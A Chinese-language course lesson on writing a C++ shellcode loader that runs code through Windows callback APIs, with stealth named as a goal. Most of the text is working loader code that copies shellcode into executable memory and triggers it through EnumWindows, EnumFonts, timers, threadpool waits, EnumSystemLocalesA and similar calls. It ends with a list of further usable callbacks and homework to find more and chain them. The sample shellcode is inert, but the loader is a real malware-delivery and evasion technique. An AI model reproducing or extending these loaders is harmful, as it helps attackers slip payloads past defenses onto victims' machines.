# 课时14 - C++ CallBack实现ShellCode Loader

## 课程目标
1. 理解Windows回调函数机制
2. 掌握各种回调API的使用方法
3. 实现多种回调方式执行ShellCode
4. 了解回调执行的隐蔽性

## 名词解释

| 术语 | 全称 | 解释 |
|------|------|------|
| Callback | 回调函数 | 由系统调用的用户定义函数 |
| EnumWindows | - | 枚举窗口的API |
| EnumFonts | - | 枚举字体的API |
| Timer Callback | 定时器回调 | 定时器触发时调用的函数 |

## 代码实现

```cpp
// callback_loader.cpp
// 回调函数方式执行ShellCode

#include <windows.h>
#include <stdio.h>

unsigned char shellcode[] = {
    0x90, 0x90, 0x90, 0x90,
    0x31, 0xC0, 0x40, 0xC3
};

LPVOID g_ShellcodeAddr = NULL;

// 准备ShellCode
LPVOID PrepareShellcode() {
    LPVOID mem = VirtualAlloc(NULL, sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (mem) {
        memcpy(mem, shellcode, sizeof(shellcode));
    }
    return mem;
}

// ============================================================
// 方法1: EnumWindows
// ============================================================
BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    // 第一次调用时执行ShellCode
    static BOOL executed = FALSE;
    if (!executed) {
        executed = TRUE;
        typedef int (*SC_FUNC)();
        ((SC_FUNC)lParam)();
    }
    return FALSE;  // 返回FALSE停止枚举
}

void Method1_EnumWindows() {
    printf("[*] Method 1: EnumWindows Callback\n");
    
    LPVOID mem = PrepareShellcode();
    if (!mem) return;
    
    EnumWindows(EnumWindowsProc, (LPARAM)mem);
    
    printf("[+] Callback executed\n");
    VirtualFree(mem, 0, MEM_RELEASE);
}

// ============================================================
// 方法2: EnumFonts
// ============================================================
int CALLBACK EnumFontProc(const LOGFONTW* lpelfe, const TEXTMETRICW* lpntme, 
                          DWORD FontType, LPARAM lParam) {
    typedef int (*SC_FUNC)();
    ((SC_FUNC)lParam)();
    return 0;  // 停止枚举
}

void Method2_EnumFonts() {
    printf("[*] Method 2: EnumFonts Callback\n");
    
    LPVOID mem = PrepareShellcode();
    if (!mem) return;
    
    HDC hdc = GetDC(NULL);
    EnumFontsW(hdc, NULL, EnumFontProc, (LPARAM)mem);
    ReleaseDC(NULL, hdc);
    
    printf("[+] Callback executed\n");
    VirtualFree(mem, 0, MEM_RELEASE);
}

// ============================================================
// 方法3: EnumChildWindows
// ============================================================
void Method3_EnumChildWindows() {
    printf("[*] Method 3: EnumChildWindows Callback\n");
    
    LPVOID mem = PrepareShellcode();
    if (!mem) return;
    
    HWND desktop = GetDesktopWindow();
    EnumChildWindows(desktop, (WNDENUMPROC)mem, 0);
    
    printf("[+] Callback executed\n");
    VirtualFree(mem, 0, MEM_RELEASE);
}

// ============================================================
// 方法4: Timer Callback
// ============================================================
void CALLBACK TimerProc(HWND hwnd, UINT uMsg, UINT_PTR idEvent, DWORD dwTime) {
    printf("[Timer] Callback triggered\n");
    
    if (g_ShellcodeAddr) {
        typedef int (*SC_FUNC)();
        ((SC_FUNC)g_ShellcodeAddr)();
        g_ShellcodeAddr = NULL;
    }
    
    KillTimer(NULL, idEvent);
    PostQuitMessage(0);
}

void Method4_Timer() {
    printf("[*] Method 4: Timer Callback\n");
    
    g_ShellcodeAddr = PrepareShellcode();
    if (!g_ShellcodeAddr) return;
    
    SetTimer(NULL, 0, 100, TimerProc);
    
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        DispatchMessage(&msg);
    }
    
    printf("[+] Timer callback executed\n");
    if (g_ShellcodeAddr) VirtualFree(g_ShellcodeAddr, 0, MEM_RELEASE);
}

// ============================================================
// 方法5: CreateThreadpoolWait
// ============================================================
void CALLBACK WaitCallback(PTP_CALLBACK_INSTANCE Instance, PVOID Context, 
                           PTP_WAIT Wait, TP_WAIT_RESULT WaitResult) {
    printf("[ThreadPool] Wait callback triggered\n");
    
    typedef int (*SC_FUNC)();
    ((SC_FUNC)Context)();
}

void Method5_ThreadPoolWait() {
    printf("[*] Method 5: ThreadPool Wait Callback\n");
    
    LPVOID mem = PrepareShellcode();
    if (!mem) return;
    
    HANDLE hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
    PTP_WAIT wait = CreateThreadpoolWait(WaitCallback, mem, NULL);
    
    SetThreadpoolWait(wait, hEvent, NULL);
    SetEvent(hEvent);  // 触发
    
    Sleep(500);  // 等待回调执行
    
    WaitForThreadpoolWaitCallbacks(wait, FALSE);
    CloseThreadpoolWait(wait);
    CloseHandle(hEvent);
    
    printf("[+] Callback executed\n");
    VirtualFree(mem, 0, MEM_RELEASE);
}

// ============================================================
// 方法6: EnumDesktops
// ============================================================
BOOL CALLBACK EnumDesktopProc(LPWSTR lpszDesktop, LPARAM lParam) {
    typedef int (*SC_FUNC)();
    ((SC_FUNC)lParam)();
    return FALSE;
}

void Method6_EnumDesktops() {
    printf("[*] Method 6: EnumDesktops Callback\n");
    
    LPVOID mem = PrepareShellcode();
    if (!mem) return;
    
    EnumDesktopsW(GetProcessWindowStation(), EnumDesktopProc, (LPARAM)mem);
    
    printf("[+] Callback executed\n");
    VirtualFree(mem, 0, MEM_RELEASE);
}

// ============================================================
// 方法7: CopyFile2 ProgressRoutine
// ============================================================
// 需要Windows 8+

// ============================================================
// 方法8: Direct Callback Execution
// ============================================================
void Method8_DirectCallback() {
    printf("[*] Method 8: Direct Shellcode as Callback\n");
    
    // 直接将ShellCode地址作为回调函数
    LPVOID mem = PrepareShellcode();
    if (!mem) return;
    
    // EnumSystemLocalesA 直接调用回调
    EnumSystemLocalesA((LOCALE_ENUMPROCA)mem, LCID_INSTALLED);
    
    printf("[+] Callback executed\n");
    VirtualFree(mem, 0, MEM_RELEASE);
}

// ============================================================
// 方法9: CertEnumSystemStore
// ============================================================
BOOL WINAPI CertStoreCallback(const void* pvSystemStore, DWORD dwFlags,
                               PCERT_SYSTEM_STORE_INFO pStoreInfo,
                               void* pvReserved, void* pvArg) {
    typedef int (*SC_FUNC)();
    ((SC_FUNC)pvArg)();
    return FALSE;
}

void Method9_CertEnum() {
    printf("[*] Method 9: CertEnumSystemStore Callback\n");
    
    LPVOID mem = PrepareShellcode();
    if (!mem) return;
    
    // 需要链接crypt32.lib
    // CertEnumSystemStore(CERT_SYSTEM_STORE_CURRENT_USER, NULL, mem, CertStoreCallback);
    
    printf("[+] Callback would execute (requires crypt32)\n");
    VirtualFree(mem, 0, MEM_RELEASE);
}

int main() {
    printf("========================================\n");
    printf("     Callback ShellCode Loader         \n");
    printf("========================================\n\n");
    
    Method1_EnumWindows();
    printf("\n");
    
    Method2_EnumFonts();
    printf("\n");
    
    Method3_EnumChildWindows();
    printf("\n");
    
    // Method4_Timer();  // 需要消息循环
    // printf("\n");
    
    Method5_ThreadPoolWait();
    printf("\n");
    
    Method6_EnumDesktops();
    printf("\n");
    
    Method8_DirectCallback();
    printf("\n");
    
    printf("[*] All methods completed\n");
    return 0;
}
```

### 更多回调方式汇总

```cpp
// 常用的回调API列表
/*
1. EnumWindows / EnumChildWindows / EnumDesktopWindows
2. EnumFonts / EnumFontFamilies
3. EnumDesktops / EnumWindowStations
4. EnumSystemLocales / EnumSystemCodePages
5. EnumResourceTypes / EnumResourceNames
6. CreateThreadpoolWork / CreateThreadpoolWait
7. SetTimer / timeSetEvent
8. CopyFile2 / CopyFileEx (ProgressRoutine)
9. CertEnumSystemStore
10. CryptEnumOIDInfo
11. EnumPropsEx
12. LineDDA
13. GrayString
14. EnumMetaFile
15. SymEnumSymbols
*/
```

## 课后作业

### 作业1：发现更多回调
查找并测试更多可用于执行ShellCode的回调API。

### 作业2：回调链
实现多个回调的链式调用。
